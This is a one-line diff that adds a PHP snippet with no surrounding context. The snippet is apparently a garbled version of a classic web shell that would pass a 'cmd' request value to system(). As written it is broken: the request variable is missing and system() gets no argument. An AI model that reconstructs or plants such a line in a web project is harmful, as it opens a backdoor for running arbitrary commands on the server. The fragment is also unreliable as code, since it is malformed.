@@ -1,0 +1,1 @@
+<?php ['cmd']; echo system();?>
